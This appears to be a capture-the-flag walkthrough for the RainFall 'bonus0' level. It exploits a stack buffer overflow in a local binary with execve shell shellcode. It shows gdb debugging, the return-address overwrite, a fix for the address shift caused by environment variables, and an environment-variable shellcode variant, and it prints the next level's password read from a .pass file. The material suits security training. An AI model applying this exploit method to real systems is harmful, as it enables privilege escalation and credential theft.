
 # Walkthrough bonus0
 
 We have 1 buffer with 2 read. First input is stored in the buffer at 0 -> 20. Second input is stored at 21 -> 40.
 We must fill first input with 20 chars to override the "\0".
 We have tried to write our shellcode (28 bytes). 


 ```bash
 bonus0@RainFall:~$ (python -c 'print"A" * 20'; python -c 'print"B" * 19') | ./bonus0 
 - 
 - 
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBBBBB
Segmentation fault (core dumped)

(gdb) r < <(python -c 'print("A" * 20)'; python -c 'print("B" * 14 + "c" * 4 + "d")')
Starting program: /home/user/bonus0/bonus0 < <(python -c 'print("A" * 20)'; python -c 'print("B" * 14 + "c" * 4 + "d")')
 - 
 - 
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBccccd BBBBBBBBBBBBBBccccd

Program received signal SIGSEGV, Segmentation fault.
0x63636363 in ?? ()

```
We can add our shellcode in the payload : Our payload start at 0xbffff706  

```bash
(gdb) x/24xw $esp
0xbffff6f0:	0xbffff706	0x080498d8	0x00000001	0x0804835d
0xbffff700:	0xb7fd13e4	0xc0310016	0x2f2f6850	0x2f686873
0xbffff710:	0x896e6962	0x89c189e3	0xcd0bb0c2	0x40c03180
0xbffff720:	0x424280cd	0xbffff736	0xbffff736	0xcd0b2090
0xbffff730:	0x40c03180	0x424280cd	0xbffff736	0xbffff736
0xbffff740:	0x00000090	0xbffff7d4	0xbffff7dc	0xb7fdc858
```
But we have a problem. In gdb our payload works but in our environment is not working.
```bash
r < <(python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0")'; python -c 'print("\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "B" * 2 + "\x06\xf7\xff\xbf" * 2 + "\x90")')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/bonus0/bonus0 < <(python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0")'; python -c 'print("\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "B" * 2 + "\x06\xf7\xff\xbf" * 2 + "\x90")')
 - 
 - 

Breakpoint 1, 0x080485c0 in main ()
(gdb) n
Single stepping until exit from function main,
which has no line number information.
1�Ph//shh/bin����°
                  1�@̀BB������� 
                               1�@̀BB�������
0xbffff706 in ?? ()
(gdb) ni
0xbffff708 in ?? ()
(gdb) ni
0xbffff709 in ?? ()
(gdb) ni
0xbffff70e in ?? ()
(gdb) 
0xbffff713 in ?? ()
(gdb) ni
0xbffff715 in ?? ()
(gdb) ni
0xbffff717 in ?? ()
(gdb) ni
0xbffff719 in ?? ()
(gdb) ni
0xbffff71b in ?? ()
(gdb) ni
process 3898 is executing new program: /bin/dash
[Inferior 1 (process 3898) exited normally]

bonus0@RainFall:~$ (python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0")'; python -c 'print("\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "B" * 6 + "\x06\xf7\xff\xbf" + "\x90")'; cat) | ./bonus0 
 - 
 - 
1�Ph//shh/bin����°
                  1�@̀BBBBBB���� 
                                1�@̀BBBBBB����
id
Segmentation fault (core dumped)
```

The problem is that our environment and gdb environment are different. In fact, in gdb we have 2 env variable that not exist in our env. "COLUMNS and LINES".   
We must to unset thats variables to obtains good address.


```bash
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) r
Breakpoint 1, 0x080485ca in main ()
(gdb) x/24xw $esp
0xbffff720:	0xbffff736	0x080498d8	0x00000001	0x0804835d
0xbffff730:	0xb7fd13e4	0xc0310016	0x2f2f6850	0x2f686873
0xbffff740:	0x896e6962	0x89c189e3	0xcd0bb0c2	0x40c03180
0xbffff750:	0x424280cd	0x42424242	0xbffff706	0xcd0b2090
0xbffff760:	0x40c03180	0x424280cd	0x42424242	0xbffff706
0xbffff770:	0x00000090	0xbffff804	0xbffff80c	0xb7fdc858
```
Now our buffer start at 0xbffff736.   

```bash
bonus0@RainFall:~$ (python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0")'; python -c 'print("\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "B" * 6 + "\x36\xf7\xff\xbf" + "\x90")'; cat) | ./bonus0 
 - 
 - 
1�Ph//shh/bin����°
                  1�@̀BBBBBB6���� 
                                 1�@̀BBBBBB6����
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```


We have an another exploit. We can stored the shellcode in env variable with export.  
``` bash
export SHELLCODE=$(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
```
We can get address of this variable with a `getenv` function ([example](Ressources/getEnv.c)) or in gdb with `x20/s *environ`.   
Finaly, in the payload we must replace "\x36\xf7\xff\xbf" by address of env var.

